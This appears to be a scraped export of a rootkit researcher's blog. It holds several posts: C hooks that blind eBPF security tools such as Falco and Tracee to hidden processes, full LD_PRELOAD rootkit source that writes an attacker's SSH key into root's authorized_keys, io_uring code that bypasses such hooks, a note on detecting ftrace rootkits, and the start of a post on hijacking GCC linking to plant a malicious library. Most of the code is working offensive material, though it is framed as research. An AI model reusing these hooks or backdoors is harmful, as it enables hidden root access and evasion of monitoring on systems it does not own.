falco_event_hdr *)data; // Validate event structure if (hdr-\u0026gt;type \u0026gt;= 1 \u0026amp;\u0026amp; hdr-\u0026gt;type \u0026lt;= 400 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026gt; 0 \u0026amp;\u0026amp; hdr-\u0026gt;len \u0026lt; 65536 \u0026amp;\u0026amp; hdr-\u0026gt;nparams \u0026lt; 20) { return true; } return false; } Hooking bpf_ringbuf_output:\nstatic notrace long hook_bpf_ringbuf_output(void *ringbuf, void *data, u64 size, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_output) return -ENOSYS; if (!data || !ringbuf) goto passthrough; // Check if this looks like a Falco event if (!is_falco_event(data, size)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // If this event is from a hidden process, drop it if (is_child_of_hidden_process(pid)) { return 0; } passthrough: return orig_bpf_ringbuf_output(ringbuf, data, size, flags); } Hooking bpf_ringbuf_reserve:\nstatic notrace void *hook_bpf_ringbuf_reserve(void *ringbuf, u64 size, u64 flags) { pid_t pid; if (!orig_bpf_ringbuf_reserve) return NULL; pid = current-\u0026gt;tgid; // Deny ringbuffer allocation for hidden processes if (is_child_of_hidden_process(pid)) { return NULL; } return orig_bpf_ringbuf_reserve(ringbuf, size, flags); } Hooking bpf_ringbuf_submit:\nstatic notrace void hook_bpf_ringbuf_submit(void *data, u64 flags) { struct falco_event_hdr *hdr; int pid; if (!orig_bpf_ringbuf_submit) return; if (!data) goto passthrough; if (!is_falco_event(data, 0)) goto passthrough; hdr = (struct falco_event_hdr *)data; pid = (int)(hdr-\u0026gt;tid \u0026amp; 0xFFFFFFFF); // Drop submission for hidden processes if (is_child_of_hidden_process(pid)) { return; } passthrough: orig_bpf_ringbuf_submit(data, flags); } How This Defeats Detection:\nFalco and Tracee see syscall events, process creation, file access, and network activity through ringbuffers. By intercepting at three points (reserve, output, submit), we ensure that events from hidden processes never make it to the ringbuffer. From Falco\u0026rsquo;s perspective, these processes simply don\u0026rsquo;t exist.\nBlocking Perf Event Submission Older tools and some Falco configurations still use perf events instead of ringbuffers. We hook these too.\nHooking perf_event_output:\nstatic notrace int hook_perf_event_output(struct perf_event *event, struct perf_sample_data *data, struct pt_regs *regs) { pid_t pid; if (!orig_perf_event_output) return -ENOSYS; pid = current-\u0026gt;tgid; // Drop perf events for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_perf_event_output(event, data, regs); } Hooking perf_trace_run_bpf_submit:\nstatic notrace void hook_perf_trace_run_bpf_submit(void *raw_data, int size, int rctx, struct pt_regs *regs, struct hlist_head *head, struct task_struct *task) { if (!orig_perf_trace_run_bpf_submit) return; // Check if the task is hidden if (task \u0026amp;\u0026amp; is_child_of_hidden_process(task-\u0026gt;pid)) { return; } // Also check current process if (is_child_of_hidden_process(current-\u0026gt;tgid)) { return; } orig_perf_trace_run_bpf_submit(raw_data, size, rctx, regs, head, task); } Manipulating BPF Maps Security tools often use BPF maps to store process metadata, track suspicious activity, or maintain state. By hooking map operations, we can prevent our processes from being recorded.\nHooking bpf_map_lookup_elem:\nstatic notrace void *hook_bpf_map_lookup_elem(struct bpf_map *map, const void *key) { void *ret; pid_t pid; if (!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, 